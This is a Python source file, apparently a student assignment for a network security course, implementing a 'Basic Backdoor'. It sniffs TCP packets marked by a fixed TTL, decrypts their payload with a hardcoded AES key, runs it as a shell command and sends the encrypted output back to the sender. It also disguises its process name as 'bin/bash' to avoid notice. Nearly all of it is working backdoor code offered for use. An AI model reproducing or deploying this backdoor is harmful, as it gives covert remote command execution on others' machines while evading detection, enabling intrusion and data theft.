#!/usr/bin/python3
'''
setup:
pip3 install pycrpyto scapy setproctitle
'''
import sys # Used for exiting the system on errors
import logging #Dependancy for next import
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
from scapy.all import * #Scapy packet crafting library
import os # Used for executing commands on shell.
from AESCipher import AESCipher
import setproctitle #Used for process masking
import argparse #used for easy arguments
import subprocess

def receivedPacket(packet : scapy.packet) -> str:
    """    
    Keyword arguments:
        packet
            type: scapy packet
            descripton: A packet with the encrypted payload 

    Return:
    decrypted payload string
    """
    global ttlKey
    if IP in packet[0]:
        if packet[IP].ttl == ttlKey:
            global cipher
            srcIP = packet[IP].src
            srcPort = packet[TCP].sport
            command = cipher.decrypt(packet["Raw"].load)
            #Execute the command
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read()  + proc.stderr.read()
            if result == "":
                result = "ERROR or No Output Produced"
            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=srcPort, dport=srcPort)/cipher.encrypt(result))
            send(newPacket, verbose = False)
            return True
        else:
            return False


#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Assignment 3 by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-p', dest='port', type = int, help = 'listen port', default=99, const=99, nargs='?')
args = arg_parser.parse_args()
#Set process title to something less suspicious
setproctitle.setproctitle("bin/bash")

#Listen for connections
listening = True
while listening:
    sniff(filter='tcp and dst port '+str(args.port), stop_filter=receivedPacket)